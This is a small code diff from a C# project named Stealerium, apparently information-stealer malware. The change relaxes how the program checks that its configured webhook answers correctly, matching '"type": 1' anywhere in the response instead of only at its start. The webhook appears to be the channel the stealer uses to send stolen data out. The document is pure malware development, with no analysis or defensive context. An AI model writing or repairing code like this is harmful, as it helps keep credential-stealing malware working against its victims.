@@ -56,7 +56,7 @@ namespace Stealerium
                 using (var client = new HttpClient())
                 {
                     var response = await client.GetStringAsync(Config.Webhook).ConfigureAwait(false);
-                    return response.StartsWith("{\"type\": 1");
+                    return response.Contains("\"type\": 1");
                 }
             }
             catch (Exception error)
